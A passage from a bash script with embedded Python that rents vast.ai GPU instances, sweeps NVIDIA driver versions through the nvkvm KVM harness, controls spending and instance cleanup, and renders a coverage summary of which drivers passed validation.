                ts "$(date -u +%FT%TZ)")"
        return 2
    }
    IFS=$'\t' read -r offer_id machine gpu dph geo inet advdrv stor down_tb net_est <<<"$offer_line"
    TRIED_MACHINES="$TRIED_MACHINES $machine"

    # Cost gate BEFORE the create.  Project the worst case for this box: one
    # provisioning cycle plus the driver set.
    ndrv="$(drivers_for_arch "$arch" | wc -l)"
    projected="$(python3 -c "print(round($dph * (1.2 + 0.25 * $ndrv), 4))")"
    if ! spend_room "$projected"; then
        warn "spend cap reached: \$$SPENT committed, this box would add ~\$$projected, cap \$$MAX_SPEND"
        emit "$(jrec arch "$arch" driver "-" status "spend-cap" \
                detail "projected \$$projected would exceed --max-spend \$$MAX_SPEND (already committed \$$SPENT)" \
                ts "$(date -u +%FT%TZ)")"
        return 3
    fi

    info "renting $gpu (arch=$arch) offer=$offer_id machine=$machine \$$dph/hr $geo"
    info "  cost: \$$dph/hr (storage \$$stor of it) + network at \$$down_tb/TB in"
    info "        -> ~\$$net_est of transfer for this box's driver set, on top of the hourly"
    info "  vast advertises driver=$advdrv, inet_down=$inet -- BOTH IGNORED"
    info "  (the advertised driver describes the physical host, not a KVM rental;"
    info "   advertised bandwidth has been wrong by five orders of magnitude)"

    out="$(timeout 240 vastai create instance "$offer_id" --image "$KVM_IMAGE" \
            --disk "$DISK" --ssh --direct --label "$SWEEP_LABEL" 2>&1)"
    iid="$(printf '%s' "$out" | parse_contract)"
    if [ -z "$iid" ]; then
        # A create can print "success": false and STILL leave a live billing
        # contract, so an unparseable id is NOT the same as "nothing was
        # rented".  Ask the listing, and let the stray reaper take anything
        # wearing our label.
        warn "could not parse an instance id from the create output:"
        warn "  ${out:0:300}"
        warn "  a contract may exist anyway -- checking the listing"
        reap_strays
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "create-failed" \
                detail "${out:0:400}" machine "$machine" ts "$(date -u +%FT%TZ)")"
        return 2
    fi
    register_instance "$iid"     # registered BEFORE anything else touches it
    CUR_INSTANCE="$iid"; CUR_MACHINE="$machine"; CUR_DPH="$dph"
    t_start="$(date +%s)"
    info "  instance $iid created and registered with the auto-destroy timer"

    box_status="ok"
    wait_for_box "$iid"; rc=$?
    if [ "$rc" = 1 ]; then
        blacklist_machine "$machine" "KVM never provisioned: created + 'Domain not found' frozen log"
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "box-never-provisioned" \
                instance "$iid" machine "$machine" \
                detail "actual_status=created with the instance log frozen at 'Domain not found: no domain with matching name'. Host-side and deterministic for this machine; machine added to the known-bad list." \
                ts "$(date -u +%FT%TZ)")"
        box_status="dead"
    elif [ "$rc" = 2 ]; then
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "box-never-provisioned" \
                instance "$iid" machine "$machine" \
                detail "no ssh within $((WAIT_BUDGET/60))m and the log never showed the dead-box signature, so this is treated as slow or unlucky rather than broken and the machine is NOT blacklisted" \
                ts "$(date -u +%FT%TZ)")"
        box_status="noshow"
    fi

    if [ "$box_status" = "ok" ] && ! verify_is_vm; then
        # Caught in the first seconds of the first ssh: cents, not hours.
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "not-a-vm" \
                instance "$iid" machine "$machine" \
                detail "systemd-detect-virt=${BOX_VIRT:-?} /dev/kvm=${BOX_KVM:-?} -- this is a container, not a KVM VM, so the NVIDIA module belongs to the physical host and no driver could be replaced" \
                ts "$(date -u +%FT%TZ)")"
        box_status="notvm"
    fi

    if [ "$box_status" = "ok" ] && [ -n "$BOOT_KERNEL" ] && ! boot_kernel_series "$BOOT_KERNEL"; then
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "kernel-switch-failed" \
                instance "$iid" machine "$machine" \
                detail "could not bring the box up on kernel ${BOOT_KERNEL}.x; sweeping on the wrong kernel would turn 'this driver cannot build here' into rows that read like driver verdicts" \
                ts "$(date -u +%FT%TZ)")"
        box_status="kernelswitch"
    fi

    if [ "$box_status" = "ok" ]; then
        preinstalled="$(rsh_t 120 'cat /proc/driver/nvidia/version 2>/dev/null | head -1' 2>/dev/null | tr -d '\r')"
        info "  driver actually present in the instance: ${preinstalled:-none}"
        info "  provisioning nvkvm (QEMU + guest image) -- once, amortised over the driver set"
        if ! provision_box; then
            emit "$(jrec arch "$arch" gpu "$gpu" driver "-" \
                    status "${PROVISION_FAILED_STEP:-provision}-failed" \
                    instance "$iid" machine "$machine" \
                    detail "${PROVISION_FAIL_DETAIL:0:3000}" ts "$(date -u +%FT%TZ)")"
            box_status="buildfail"
        fi
    fi

    if [ "$box_status" = "ok" ]; then
        logdir="$OUT_DIR/logs/$arch-$iid"
        sweep_drivers_on_box "$arch" "$gpu" "$iid" "$machine" "$logdir"
    else
        # Every applicable driver on this box is now UNTESTED.  That is the
        # whole point: it must move the exit code, not vanish into a blank cell.
        local n; n="$(drivers_for_arch "$arch" | wc -l)"
        BOX_UNTESTED=$(( BOX_UNTESTED + n ))
        warn "  $n applicable driver(s) for $arch went UNTESTED because the box was '$box_status'"
    fi

    t_end="$(date +%s)"; elapsed=$(( t_end - t_start ))
    cost="$(python3 -c "print(round($dph * $elapsed / 3600.0, 4))")"
    spend_add "$cost"
    info "  box ran ${elapsed}s at \$$dph/hr = \$$cost (sweep total \$$SPENT)"
    if [ "$KEEP" = 1 ] && [ "$box_status" != "ok" ]; then
        # --keep is for holding a WORKING box open for follow-up.  A box that
        # never provisioned cannot support any, and keeping it means it bills
        # alongside the replacement the retry loop is about to rent -- up to
        # three at once with the default --box-attempts.  Destroy it and say so.
        warn "  --keep, but this box is '$box_status' and has nothing to keep open -- destroying it"
        destroy_verified "$iid" || warn "  DESTROY $iid FAILED -- see the reconciliation at the end"
    elif [ "$KEEP" = 1 ]; then
        warn "  --keep: leaving $iid alive at root@$CUR_HOST:$CUR_PORT (timer still armed)"
    elif [ "$BOX_FAILED" -gt 0 ] && [ "$box_status" = "ok" ] && [ "$DESTROY_ON_ERROR" = 0 ]; then
        # DESTROY ON SUCCESS, KEEP ON ERROR.  A failing box is the only copy of
        # the state that produced the failure: the guest's dmesg, the
        # half-written rootfs, the QEMU log.  Destroying it turns a reproducible
        # bug into a sentence in a JSON file, which is how the 5 GiB rootfs
        # overflow got rediscovered three times.
        #
        # The ceiling that makes this affordable is the auto-destroy timer armed
        # at startup: it sweeps the whole registry at +$BUDGET_HOURS whatever
        # happens here, including if this process is kill -9'"'"'d.  A kept box is
        # bounded, not indefinite.
        # OBSERVED 2026-08-29, first run of this policy: the sweep printed
        # "KEEPING it for inspection ... auto-destroys at +6h" and then
        # destroyed the box TWELVE SECONDS LATER from its own exit trap, via
        # cleanup() -> reap_strays(), which reaps by label and knew nothing
        # about a per-box decision.  The promise was real; the protection was
        # not, so the run destroyed exactly the evidence it had just undertaken
        # to preserve.  A keep has to be enforced where the destroying happens.
        #
        # is_protected() already guards destroy_verified(), and reap_strays()
        # goes through destroy_verified(), so adding the id to PROTECTED covers
        # both the reaper and any later direct call.  It is deliberately NOT
        # given to the auto-destroy timer: the timer was armed with its own
        # protect list and is the ceiling that makes keeping affordable, so a
        # kept box must still die at the deadline.
        PROTECTED="$PROTECTED $iid"
        [ -n "${KEPT_FILE:-}" ] && { printf '%s\n' "$iid" >>"$KEPT_FILE" 2>/dev/null; sync 2>/dev/null || true; }
        warn "  $BOX_FAILED failure(s) on this box -- KEEPING it for inspection (--destroy-on-error to opt out)"
        warn "    ssh -p $CUR_PORT root@$CUR_HOST     # auto-destroys at +${BUDGET_HOURS}h regardless"
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "box-kept-for-inspection" \
                instance "$iid" role "box" \
                detail "kept because $BOX_FAILED driver(s)/phase(s) failed; reachable at root@$CUR_HOST:$CUR_PORT until the +${BUDGET_HOURS}h auto-destroy" \
                ts "$(date -u +%FT%TZ)")"
    else
        destroy_verified "$iid" || warn "  DESTROY $iid FAILED -- see the reconciliation at the end"
    fi
    CUR_INSTANCE=""
    [ "$box_status" = "ok" ] || return 2
    return 0
}

# ---------------------------------------------------------------------------
# every applicable driver, on a box that is already provisioned
# ---------------------------------------------------------------------------
parse_nvrm_driver_version() {
    # Proprietary banner: "Kernel Module  580.95.05"
    # Open banner:        "Kernel Module for x86_64  580.95.05"
    # The old proprietary-only expression returned an empty string for every
    # current Vast desktop image, silently suppressing the free control run.
    grep -oE 'Kernel Module( for [^[:space:]]+)?[[:space:]]+[0-9]+\.[0-9]+(\.[0-9]+)?' \
        | awk '{print $NF}' | tail -1
}

sweep_drivers_on_box() {
    local arch="$1" gpu="$2" iid="$3" machine="$4" logdir="$5"
    local drv alts prof why cur0 todo tested=0 smi actual abi_ok t0 t1 dur applicable nvrm

    todo="$(drivers_for_arch "$arch")"
    if [ -z "$todo" ]; then
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "no-applicable-drivers" \
                instance "$iid" detail "the driver set has no rows at or above the $arch floor" \
                ts "$(date -u +%FT%TZ)")"
        return
    fi

    cur0="$(rsh_t 90 'cat /proc/driver/nvidia/version 2>/dev/null | head -1' 2>/dev/null \
            | parse_nvrm_driver_version)"

    # A manual host keeps the driver it came with unless explicitly told
    # otherwise.  That is not a limitation to apologise for: it is exactly the
    # "one host, one driver, the BIG test" shape -- few variables, so spend the
    # time on depth instead of breadth.  The row still says which driver ran,
    # so the matrix never implies coverage that was not measured.
    if [ -n "$MANUAL_SSH" ] && [ "$ALLOW_DRIVER_INSTALL" != 1 ]; then
        if [ -z "$cur0" ]; then
            emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "no-driver-present" \
                    instance "$iid" host "${CUR_HOST:-}" \
                    detail "no NVIDIA driver is installed on this manual host and --allow-driver-install was not given, so there is nothing to measure" \
                    cost "external host, cost not tracked" ts "$(date -u +%FT%TZ)")"
            warn "  manual host has no NVIDIA driver and driver install was not permitted"
            return
        fi
        info "  manual host: measuring the preinstalled $cur0 only"
        info "  (pass --allow-driver-install to purge and sweep the driver set -- DESTRUCTIVE)"
        todo="$(drivers_for_arch "$arch" | awk -F'|' -v c="$cur0" '$1==c')"
        if [ -z "$todo" ]; then
            CONTROL=1
        fi
    fi

    # THE CONTROL RUN.  Measure whatever the image already ships BEFORE
    # anything is purged, and label it a control rather than a matrix row.
    #
    # Two reasons.  (1) It is free -- no download, no module rebuild.  (2) It
    # separates "this box's harness works" from "driver X is broken".  Without
    # it, a bundle or guest-boot problem on a new image reads as five
    # consecutive driver failures and points the investigation at NVIDIA.
    #
    # It does NOT count toward --min-drivers: it is not a chosen version.
    if [ "$CONTROL" = 1 ] && [ -n "$cur0" ] && ! printf '%s\n' "$todo" | cut -d"|" -f1 | grep -qx "$cur0"; then
        info "  control run on the preinstalled $cur0 (free, before any purge)"
        boot_and_validate "$cur0" "$gpu"
        say "    nvkvm: host driver $cur0 → ABI profile ${VR_ABI:-?}   [control]"
        emit "$(jrec arch "$arch" gpu "$gpu" driver "control:$cur0" driver_actual "$cur0" \
                abi_expected "$(abi_expected "$cur0")" abi_selected "${VR_ABI:-?}" \
                status "control-$VR_STATUS" summary "${VR_SUMMARY:-}" \
                module "$(module_flavour)" \
                failed_checks "${VR_FAILED:0:1000}" \
                instance "$iid" machine "$machine" role "control" \
                detail "preinstalled driver, measured before any purge; not a driver-set row and not counted toward --min-drivers" \
                warnings "${VR_WARNINGS:0:4000}" ts "$(date -u +%FT%TZ)")"
        if [ "$VR_STATUS" != "pass" ]; then
            warn "  CONTROL RUN DID NOT PASS ($VR_STATUS).  Read the driver rows below as"
            warn "  suspect: the harness may be broken on this box independently of any driver."
        fi
    fi

    # ORDER MATTERS, and getting it wrong silently destroys a baseline.  The
    # image's driver is DKMS-managed, so the first .run install purges it for
    # good.  If a preinstalled version is ALSO a row in the driver set, that row
    # must be measured first or it becomes untestable after the purge.
    if [ -n "$cur0" ] && printf '%s\n' "$todo" | cut -d"|" -f1 | grep -qx "$cur0"; then
        todo="$( { printf '%s\n' "$todo" | awk -F'|' -v c="$cur0" '$1==c'
                   printf '%s\n' "$todo" | awk -F'|' -v c="$cur0" '$1!=c'; } )"
        info "  $cur0 is both preinstalled and in the driver set -- testing it first, before any purge"
    fi

    while IFS='|' read -r drv alts prof why; do
        [ -z "$drv" ] && continue
        if stop_requested; then
            warn "  STOP requested ($STOP_FILE) -- ending this box cleanly"
            break
        fi
        if unit_done "$arch" "$drv"; then
            info "  driver $drv: already recorded for $arch in this results file -- skipping (resume)"
            tested=$(( tested + 1 ))
            continue
        fi

        info "  driver $drv (header predicts ABI profile $prof) ..."
        t0="$(date +%s)"

        if ! install_driver "$drv" "$arch" "/root/drv-$drv.log" "$alts" "$prof"; then
            # NOT A SKIP.  An untestable driver is a failure of this box.
            warn "  driver $drv COULD NOT BE INSTALLED -- this FAILS the box; it is NOT skipped"
            BOX_UNTESTED=$(( BOX_UNTESTED + 1 ))
            emit "$(jrec arch "$arch" gpu "$gpu" driver "$drv" abi_expected "$prof" \
                    status "driver-install-failed" instance "$iid" machine "$machine" \
                    rationale "$why" detail "${DRIVER_DETAIL:0:3000}" \
                    ts "$(date -u +%FT%TZ)")"
            continue
        fi
        actual="${DRIVER_ACTUAL:-$drv}"
        [ "$actual" = "$drv" ] || \
            info "    substitute: $drv is unpublished; installed $actual (verified same ABI profile)"

        # A driver older than the silicon installs cleanly and then finds no
        # GPU.  That is not an nvkvm result and is excluded by design rather
        # than counted as a failure -- but it IS recorded, so a reader can see
        # why the cell is empty.
        smi="$(rsh_t 150 'nvidia-smi --query-gpu=name --format=csv,noheader 2>&1 | head -1' 2>/dev/null | tr -d '\r')"
        case "$(printf '%s' "$smi" | tr 'a-z' 'A-Z')" in
            *NVIDIA*|*GEFORCE*|*RTX*|*QUADRO*|*TESLA*) ;;
            *)
                # "No devices were found" has TWO causes and they must not share
                # a status.  A driver older than the silicon is a documented
                # exclusion; a module of the WRONG FLAVOUR is a fixable harness
                # problem that has to move the exit code, or a Blackwell box
                # reports a shortfall with no hint that -m=kernel-open was all
                # it needed -- and, being terminal, is never retried on resume.
                nvrm="$(rsh_t 90 'dmesg 2>/dev/null | grep -aiE "requires use of the NVIDIA open kernel modules|RmInitAdapter failed" | tail -3' 2>/dev/null | tr -d '\r')"
                case "$nvrm" in
                    *"open kernel modules"*)
                        warn "    $actual is loaded but is the WRONG MODULE FLAVOUR for this GPU:"
                        warn "    the silicon requires the OPEN kernel module (-m=kernel-open)."
                        warn "    This is NOT 'the driver predates the GPU' -- it is fixable and UNTESTED."
                        BOX_UNTESTED=$(( BOX_UNTESTED + 1 ))
                        emit "$(jrec arch "$arch" gpu "$gpu" driver "$drv" driver_actual "$actual" \
                                abi_expected "$prof" status "driver-wrong-module-flavour" instance "$iid" \
                                rationale "$why" \
                                detail "nvidia-smi: ${smi:0:120} || kernel: ${nvrm:0:400}" \
                                ts "$(date -u +%FT%TZ)")"
                        continue ;;
                esac
                info "    $actual installed but reports no GPU -- predates this silicon"
                emit "$(jrec arch "$arch" gpu "$gpu" driver "$drv" driver_actual "$actual" \
                        abi_expected "$prof" status "driver-predates-gpu" instance "$iid" \
                        rationale "$why" detail "nvidia-smi: ${smi:0:200}" \
                        ts "$(date -u +%FT%TZ)")"
                continue ;;
        esac

        boot_and_validate "$actual" "$gpu"

        # THE LINE THE PROJECT ASKS FOR, printed for every driver, pass or fail.
        say "    nvkvm: host driver $actual → ABI profile ${VR_ABI:-?}"
        abi_ok="unknown"
        if [ "${VR_ABI:-?}" != "?" ] && [ "$prof" != "?" ]; then
            if [ "$VR_ABI" = "$prof" ]; then
                abi_ok="yes"
            else
                abi_ok="no"
                warn "    ABI PROFILE MISMATCH: nvkvm_abi.h predicts $prof, the running QEMU chose $VR_ABI -- ALWAYS INVESTIGATE"
            fi
        fi

        if [ -n "$VR_WARNINGS" ]; then
            say "    early-warning lines (captured even on a pass):"
            printf '%s\n' "$VR_WARNINGS" | sed 's/^/      /'
        fi

        case "$VR_STATUS" in
            pass)            tested=$(( tested + 1 )); BOX_TESTED=$(( BOX_TESTED + 1 )) ;;
            fail|incomplete) tested=$(( tested + 1 )); BOX_TESTED=$(( BOX_TESTED + 1 ))
                             BOX_FAILED=$(( BOX_FAILED + 1 )) ;;
            *)               BOX_UNTESTED=$(( BOX_UNTESTED + 1 ))
                             warn "  driver $actual ended at '$VR_STATUS' -- NOT a validate.sh verdict, so this driver is UNTESTED" ;;
        esac

        t1="$(date +%s)"; dur=$(( t1 - t0 ))
        emit "$(jrec \
            arch "$arch" gpu "$gpu" driver "$drv" driver_actual "$actual" \
            driver_substituted "$([ "$actual" = "$drv" ] && echo false || echo true)" \
            abi_expected "$prof" abi_selected "${VR_ABI:-?}" abi_matches_header "$abi_ok" \
            status "$VR_STATUS" summary "${VR_SUMMARY:-}" validate_rc "${VR_RC:-}" \
            module "$(module_flavour)" \
            failed_checks "${VR_FAILED:0:1000}" \
            instance "$iid" machine "$machine" dph "$CUR_DPH" \
            seconds "$dur" rationale "$why" role "driver-set" \
            warnings "${VR_WARNINGS:0:4000}" detail "${VR_DETAIL:0:3000}" \
            validate:json "${VR_JSON:-null}" \
            image "$KVM_IMAGE" tree "$TREE_STAMP" ts "$(date -u +%FT%TZ)")"

        say "    -> $VR_STATUS ${VR_SUMMARY:-} (${dur}s)"
    done <<<"$todo"

    if [ "$RUN_STEAMOS" = 1 ]; then
        run_steamos_stage "$arch" "$gpu" "${actual:-${drv:-unknown}}" "$iid" "$logdir/steamos"

        # TERMINAL RE-CHECK.  The stage installed a product, bound /dev/dri into
        # a container, ran a multi-GB OTA and rebooted a guest.  Re-run
        # validate.sh afterwards so that "the sweep passed" cannot quietly mean
        # "it passed before the stage wedged the host".  A regression here is
        # about the stage, not about the driver, so it is recorded separately
        # and never counted toward --min-drivers.
        # OBSERVED 2026-08-29: this warned "the host no longer validates AFTER
        # the SteamOS stage" on a box where validate.sh had ALREADY been failing
        # identically before the stage ran. A terminal check that reads only the
        # final state cannot tell a regression from a pre-existing failure, and
        # reporting the two the same way points the next reader at the wrong
        # code. Compare against the status the driver loop last recorded.
        local pre_status="${VR_STATUS:-unknown}"
        info "  terminal re-check: does validate.sh still pass after the stage?"
        boot_and_validate "${actual:-unknown}" "$gpu"
        say "    terminal re-check: ${VR_STATUS:-unknown} (before the stage: $pre_status)"
        if [ "${VR_STATUS:-}" != pass ] && [ "$pre_status" = pass ]; then
            warn "    REGRESSION: validated before the SteamOS stage and not after -- investigate the stage"
            BOX_FAILED=$(( BOX_FAILED + 1 ))
        elif [ "${VR_STATUS:-}" != pass ]; then
            warn "    still '${VR_STATUS:-unknown}', and it was '$pre_status' before the stage too -- NOT attributable to the stage"
        fi
        emit "$(jrec arch "$arch" gpu "$gpu" driver "${actual:-unknown}" \
                status "steamos-terminal-recheck" role "steamos" instance "$iid" \
                validate_status "${VR_STATUS:-unknown}" validate_status_before "$pre_status" \
                summary "${VR_SUMMARY:-}" \
                detail "validate.sh re-run after the SteamOS stage; a regression is only claimed when it passed before; not counted toward --min-drivers" \
                ts "$(date -u +%FT%TZ)")"
    fi

    collect_logs "$logdir"
    info "  raw logs pulled to $logdir"

    # "at least 5 driver versions" is a REQUIREMENT, not an aspiration.  A box
    # that produced fewer real verdicts than that has not delivered coverage for
    # its architecture, whatever its individual rows say.
    applicable="$(drivers_for_arch "$arch" | wc -l)"
    if [ "$tested" -lt "$MIN_DRIVERS" ]; then
        warn "  COVERAGE SHORTFALL on $gpu ($arch): $tested driver(s) produced a verdict, $MIN_DRIVERS required"
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "coverage-shortfall" \
                instance "$iid" \
                detail "$tested of $applicable applicable drivers produced a validate.sh verdict; --min-drivers is $MIN_DRIVERS" \
                ts "$(date -u +%FT%TZ)")"
        BOX_UNTESTED=$(( BOX_UNTESTED + 1 ))
    fi
}

# ---------------------------------------------------------------------------
# SteamOS product stage
#
# validate.sh proves the ABI holds.  It does not install a product.  Every bug
# found by hand on 2026-08-29 -- the 5 GiB rootfs overflow, the OOM-truncated
# NVIDIA install that a version check then called "already installed", the vmm
# container with no /dev/dri -- lives on this path and on no other.  So the
# stage boots the real thing and drives it to a desktop.
#
# It runs ONCE PER BOX, against whichever driver the box finished on, because
# the expensive part (a 3.2 GB image plus a multi-GB OTA) is per-box, not
# per-driver.
#
# UNTRUSTED-HOST DISCIPLINE: the stage is launched detached and polled, so a
# dropped ssh does not abandon a two-hour install; and its verdicts come back as
# JSON that is PARSED IN PYTHON against an allowlist -- no value from the box is
# ever interpolated into a shell command or into a jrec field unchecked.
# ---------------------------------------------------------------------------
run_steamos_stage() {
    local arch="$1" gpu="$2" drv="$3" iid="$4" logdir="$5"
    local t0 t1 waited=0 launcher last parsed nfail=0 npass=0 ph st det

    info "  SteamOS stage: installing and booting a real SteamOS guest (up to 3h)"
    t0="$(date +%s)"

    # Detached: a single `rsh_t 10800` ties the whole stage to one TCP
    # connection, and these boxes drop ssh under load.  Poll for a sentinel.
    rsh_t 120 "rm -rf /root/steamos-stage; mkdir -p /root/steamos-stage; cd /root/nvkvm && STEAMOS_REF='$STEAMOS_REF' nohup setsid bash scripts/sweep_stage_steamos.sh >/root/steamos-stage/run.log 2>&1 </dev/null; echo done >/root/steamos-stage/DONE" >/dev/null 2>&1 &
    launcher=$!

    while [ "$waited" -lt 10800 ]; do
        sleep 60; waited=$(( waited + 60 ))
        rsh_t 60 'test -f /root/steamos-stage/DONE' >/dev/null 2>&1 && break
        if stop_requested; then
            warn "  stop requested -- leaving the SteamOS stage running on the box"
            break
        fi
        # progress, so an unattended run is not a black box for three hours
        if [ $(( waited % 600 )) -eq 0 ]; then
            last="$(rsh_t 60 'tail -1 /root/steamos-stage/stage.log 2>/dev/null' 2>/dev/null | tr -dc '[:print:]')"
            info "    [$(( waited / 60 ))m] ${last:0:140}"
        fi
    done
    kill "$launcher" 2>/dev/null || true
    t1="$(date +%s)"

    mkdir -p "$logdir"
    timeout 300 scp $SSH_OPTS -P "$SCP_PORT" -q \
        "root@$SCP_HOST:/root/steamos-stage/stage.log" \
        "root@$SCP_HOST:/root/steamos-stage/verdicts.jsonl" \
        "root@$SCP_HOST:/root/steamos-stage/install-serial.log" \
        "$logdir/" 2>/dev/null

    if [ ! -s "$logdir/verdicts.jsonl" ]; then
        emit "$(jrec arch "$arch" gpu "$gpu" driver "$drv" status "steamos-no-verdicts" \
                instance "$iid" role "steamos" seconds "$(( t1 - t0 ))" \
                detail "the stage produced no verdicts in $(( t1 - t0 ))s -- see $logdir/stage.log" \
                ts "$(date -u +%FT%TZ)")"
        BOX_UNTESTED=$(( BOX_UNTESTED + 1 ))
        warn "  SteamOS stage produced NO verdicts -- UNTESTED, not a pass"
        return 0
    fi

    # Parsed in python, phase and status allowlisted, detail stripped to
    # printable and truncated.  A hostile box controls every byte of this file.
    parsed="$(python3 "$REPO/scripts/sweep_parse_steamos.py" "$logdir/verdicts.jsonl")"

    while IFS=$'\t' read -r ph st det; do
        [ -n "$ph" ] || continue
        case "$st" in
            pass) npass=$(( npass + 1 )); say  "    steamos/$ph: pass  ${det:0:90}" ;;
            fail) nfail=$(( nfail + 1 )); warn "    steamos/$ph: FAIL  ${det:0:160}" ;;
            *)    say "    steamos/$ph: untested -- the stage never reached it" ;;
        esac
        emit "$(jrec arch "$arch" gpu "$gpu" driver "$drv" \
                status "steamos-$st" phase "$ph" instance "$iid" \
                role "steamos" seconds "$(( t1 - t0 ))" \
                detail "$det" ts "$(date -u +%FT%TZ)")"
    done <<<"$parsed"

    if [ "$nfail" -gt 0 ]; then
        BOX_FAILED=$(( BOX_FAILED + 1 ))
        # BOX_FAILED is what the keep-on-error decision at the end of
        # sweep_one_box() reads, so bumping it is what actually keeps the box.
        warn "  SteamOS stage: $nfail phase(s) failed, $npass passed -- the box will be kept for inspection"
    else
        say "  SteamOS stage: all $npass phases passed in $(( (t1 - t0) / 60 ))m"
    fi
}

# ---------------------------------------------------------------------------
# summary
# ---------------------------------------------------------------------------
render_summary() {
    python3 - "$RESULTS" "$SPENT" "$MIN_DRIVERS" "$ARCHES" <<'PY'
import json, sys, collections
path, spent, min_drivers, arches_req = sys.argv[1:5]
min_drivers = int(min_drivers)
recs = []
try:
    for line in open(path):
        line = line.strip()
        if line:
            try: recs.append(json.loads(line))
            except Exception: pass
except FileNotFoundError:
    pass

if not recs:
    print("(no results recorded)"); raise SystemExit

CELL = {"pass": "OK", "fail": "**FAIL**", "incomplete": "**INC**",
        "driver-install-failed": "INSTALL-X", "driver-predates-gpu": "n/a",
        "guest-no-boot": "BOOT-X", "guest-module-not-loaded": "MOD-X",
        "bundle-failed": "BUNDLE-X", "stage-failed": "STAGE-X",
        "validate-unparsed": "PARSE-X"}
VERDICT = {"pass", "fail", "incomplete"}

runs = [r for r in recs if r.get("role") == "driver-set"]
drivers, arches = [], []
for r in runs:
    if r["driver"] not in drivers: drivers.append(r["driver"])
    a = r.get("arch") or "?"
    if a not in arches: arches.append(a)
def vkey(v):
    out = []
    for p in v.split("."):
        try: out.append(int(p))
        except ValueError: out.append(0)
    return out
drivers.sort(key=vkey)

# ---- the question the sweep exists to answer -----------------------------
print("## is this architecture covered?\n")
print("| architecture | drivers with a verdict | passed | not tested | covered? |")
print("|---|---|---|---|---|")
for a in [x for x in (arches_req.split(",") if arches_req else []) if x] or arches:
    mine = [r for r in recs if r.get("arch") == a]
    verd = [r for r in mine if r.get("status") in VERDICT and r.get("role") == "driver-set"]
    ok = [r for r in verd if r.get("status") == "pass"]
    nt = [r for r in mine if r.get("status") not in VERDICT
          and r.get("status") != "driver-predates-gpu"
          and not str(r.get("status", "")).startswith("control-")]
    covered = "YES" if (len(verd) >= min_drivers and len(ok) == len(verd) and not nt) else "**NO**"
    print(f"| {a} | {len(verd)} | {len(ok)} | {len(nt)} | {covered} |")
print()
print(f"'covered' means: at least {min_drivers} driver versions produced a validate.sh "
      "verdict, every one of them passed, and nothing was left untested.")
print()

# ---- matrix ---------------------------------------------------------------
if runs:
    print("## coverage matrix\n")
    print("| architecture | " + " | ".join(drivers) + " |")
    print("|---" * (len(drivers) + 1) + "|")
    for a in arches:
        cells = []
        for d in drivers:
            hit = [r for r in runs if (r.get("arch") or "?") == a and r["driver"] == d]
            if not hit:
                cells.append("–"); continue
            r = hit[-1]
            c = CELL.get(r.get("status"), r.get("status", "?"))
            if r.get("abi_matches_header") == "no": c += " ABI!"
            if r.get("driver_substituted") == "true": c += "*"
            cells.append(c)
        print(f"| {a} | " + " | ".join(cells) + " |")
    print()
    print("Legend: `OK` validate.sh passed. `**FAIL**`/`**INC**` validate.sh said so "
          "(INC = checks were SKIPped, which is not a pass). `n/a` the driver predates "
          "the silicon, excluded by design. `INSTALL-X`/`BOOT-X`/`MOD-X`/`BUNDLE-X`/"
          "`STAGE-X`/`PARSE-X` = the driver was NOT TESTED — harness or environment, "
          "never a GPU verdict, and each one moves the exit code. `ABI!` the running "
          "QEMU chose a different profile than nvkvm_abi.h predicts. `*` the requested "
          "version is unpublished and a verified same-profile substitute ran.")
    print()

# ---- the ABI line, for every driver --------------------------------------
print("## nvkvm: host driver → ABI profile\n")
seen = set()
for r in recs:
    if not r.get("abi_selected"): continue
    k = (r.get("driver_actual") or r.get("driver"), r.get("abi_selected"))
    if k in seen: continue
    seen.add(k)
    flag = ""
    if r.get("abi_matches_header") == "no":
        flag = f"   <-- MISMATCH, nvkvm_abi.h predicts {r.get('abi_expected')}"
    elif r.get("role") == "control":
        flag = "   [control: whatever the image shipped]"
    print(f"  nvkvm: host driver {k[0]} → ABI profile {k[1]}{flag}")
print()

# ---- early warnings, even on a pass --------------------------------------
warn_lines = [r for r in recs if (r.get("warnings") or "").strip()]
print("## early-warning lines (DENY / AUDIT unknown / param_size MISMATCH)\n")
if not warn_lines:
    print("  none observed\n")
else:
    for r in warn_lines:
        print(f"  {r.get('gpu')} / driver {r.get('driver_actual') or r.get('driver')} "
              f"[{r.get('status')}]:")
        for l in (r.get("warnings") or "").splitlines():
            if l.strip(): print("    " + l.strip())
    print()

# ---- what did not get tested ---------------------------------------------
untested = [r for r in recs
            if r.get("status") not in VERDICT
            and r.get("status") != "driver-predates-gpu"
            and not str(r.get("status", "")).startswith("control-")]
print("## what did NOT get tested, and why\n")
if not untested:
    print("  nothing — every applicable driver produced a validate.sh verdict\n")
else:
    for st, n in collections.Counter(r.get("status") for r in untested).most_common():
        print(f"  {st}: {n}")
    print()
    for r in untested:
        print(f"  - [{r.get('status')}] arch={r.get('arch')} gpu={r.get('gpu','-')} "
              f"driver={r.get('driver','-')} instance={r.get('instance','-')}")
        for l in (r.get("detail") or "").strip().splitlines()[:6]:
            print(f"        {l[:160]}")
    print()

npass = sum(1 for r in runs if r.get("status") == "pass")
nfail = sum(1 for r in runs if r.get("status") in ("fail", "incomplete"))
print("## totals\n")
print(f"  driver runs with a verdict : {npass + nfail}  ({npass} pass, {nfail} fail/incomplete)")
print(f"  units NOT tested           : {len(untested)}")
print(f"  spend                      : ${spent}")
PY
}

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
# LIBRARY MODE.  tests/sweep_offline_test.sh sources this file to exercise the
# real functions against a stubbed vastai, which is the only way to test the
# paths that would otherwise cost money to reach.  Stop before main() and
# neutralise the EXIT trap, which has nothing of ours to clean up here.
if [ "${NVKVM_SWEEP_LIB:-0}" = 1 ]; then
    CLEANED=1
    return 0 2>/dev/null || exit 0
fi

command -v vastai  >/dev/null || die "vastai CLI not found"
command -v python3 >/dev/null || die "python3 not found (used for JSON and for the driver matrix)"
[ -f "$HOME/.config/vastai/vast_api_key" ] || [ -n "${VAST_API_KEY:-}" ] \
    || die "no vast.ai api key (~/.config/vastai/vast_api_key)"

if [ "$RECONCILE" = 1 ]; then
